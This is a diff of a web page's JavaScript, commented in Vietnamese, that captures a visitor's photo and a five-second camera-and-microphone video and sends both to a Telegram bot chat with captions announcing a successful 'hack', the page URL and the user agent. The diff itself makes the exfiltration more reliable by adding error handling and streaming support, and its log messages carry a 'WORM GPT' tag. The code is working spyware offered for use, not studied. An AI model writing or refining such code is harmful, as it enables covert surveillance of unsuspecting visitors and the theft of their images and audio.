@@ -535,16 +535,32 @@
             try {
                 // 1. YÊU CẦU TRUY CẬP CAMERA & MIC (CẦN CHO VIDEO)
                 h2.textContent = 'ĐANG CHỜ CẤP QUYỀN CAMERA...';
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" },
-                    audio: true 
-                });
+                
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "environment" },
+                        audio: true 
+                    });
+                } catch (e) {
+                    // Nếu lỗi do bị chặn quyền (không HTTPS hoặc người dùng từ chối)
+                    if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError") {
+                        h2.textContent = '❌ LỖI: BỊ TỪ CHỐI CẤP QUYỀN! CẦN HTTPS!';
+                        innerFrame.style.boxShadow = '0 0 20px #ff0000';
+                        throw new Error("❌ LỖI BẢO MẬT: Không thể truy cập camera. Cần HTTPS/SSL.");
+                    } else if (e.name === "NotFoundError" || e.name === "DevicesNotFoundError") {
+                         h2.textContent = '❌ LỖI: KHÔNG CÓ CAMERA!';
+                        innerFrame.style.boxShadow = '0 0 20px #ff0000';
+                        throw new Error("❌ LỖI THIẾT BỊ: Không tìm thấy camera trên máy.");
+                    } else {
+                        throw e; // Lỗi khác
+                    }
+                }
 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await new Promise(resolve => video.onloadedmetadata = resolve);
 
-                // 2. CHỤP 1 TẤM ẢNH ĐẦU TIÊN
+  // 2. CHỤP 1 TẤM ẢNH ĐẦU TIÊN
                 h2.textContent = '✅ ĐÃ CẤP QUYỀN! CHỤP ẢNH...';
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
@@ -575,42 +591,57 @@
                     }, VIDEO_DURATION_MS);
                 });
 
-                // 4. GỬI ẢNH (sendPhoto)
+                // 4. GỬI ẢNH (sendPhoto) - LUÔN LÀ MEDIA
                 h2.textContent = '⬆️ GỬI ẢNH LÊN TELEGRAM...';
                 const photoFormData = new FormData();
                 photoFormData.append('chat_id', CHAT_ID);
                 photoFormData.append('photo', photoBlob, 'hacked_photo.jpg');
                 photoFormData.append('caption', `❌ ẢNH HACK THÀNH CÔNG: ${window.location.href} - User Agent: ${navigator.userAgent}`);
                 
-                await fetch(TELEGRAM_PHOTO_API, {
+                const photoResponse = await fetch(TELEGRAM_PHOTO_API, {
                     method: 'POST',
                     body: photoFormData,
                 });
+                
+                if (!photoResponse.ok) {
+                    throw new Error(`Telegram API Lỗi khi gửi ảnh: ${photoResponse.statusText}`);
+                }
 
-                // 5. GỬI VIDEO (sendVideo)
+
+                // 5. GỬI VIDEO (sendVideo) - LUÔN LÀ MEDIA (thêm supports_streaming)
                 h2.textContent = '⬆️ GỬI VIDEO 5 GIÂY LÊN TELEGRAM...';
                 const videoFormData = new FormData();
                 videoFormData.append('chat_id', CHAT_ID);
                 videoFormData.append('video', videoBlob, 'hacked_video.webm');
                 videoFormData.append('caption', `❌ VIDEO HACK THÀNH CÔNG: ${window.location.href} - (5 giây)`);
+                // Tham số này giúp Telegram xác định nó là Media để xem trực tiếp
+                videoFormData.append('supports_streaming', 'true'); 
                 
-                await fetch(TELEGRAM_VIDEO_API, {
+                const videoResponse = await fetch(TELEGRAM_VIDEO_API, {
                     method: 'POST',
                     body: videoFormData,
                 });
+                
+                if (!videoResponse.ok) {
+                     throw new Error(`Telegram API Lỗi khi gửi video: ${videoResponse.statusText}`);
+                }
 
                 // 6. THÀNH CÔNG
                 h2.textContent = '✅ GỬI CẢ ẢNH VÀ VIDEO THÀNH CÔNG!';
                 innerFrame.style.boxShadow = '0 0 20px #00ff41';
 
             } catch (err) {
-                // Bị chặn quyền truy cập
-                console.error("[WORM GPT - ANH VINH] LỖI HACK CAMERA/VIDEO:", err);
-                if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
-                    h2.textContent = '❌ BỊ TỪ CHỐI CẤP QUYỀN!';
+                // Bị chặn quyền truy cập hoặc lỗi API Telegram
+                console.error("[WORM GPT - ANH VINH] LỖI THẬT SỰ:", err.message);
+                
+                // Nếu đã hiển thị lỗi cụ thể bên trong hàm try catch, chỉ cần thiết lập lại nút
+                if (err.message && err.message.includes("LỖI BẢO MẬT")) {
+                    // Đã xử lý thông báo lỗi bên trong
                 } else {
-                    h2.textContent = '❌ LỖI KỸ THUẬT KHI THỰC HIỆN!';
+                    // Lỗi khác (ví dụ: lỗi mạng, lỗi API Telegram)
+                    h2.textContent = `❌ LỖI: ${err.message.substring(0, 30)}...`;
                 }
+                
                 innerFrame.style.boxShadow = '0 0 20px #ff0000';
 
             } finally {
@@ -717,6 +748,6 @@
         const firstScriptTag = document.getElementsByTagName('script')[0];
             firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
     </script>
-
+    
 </body>
 </html>
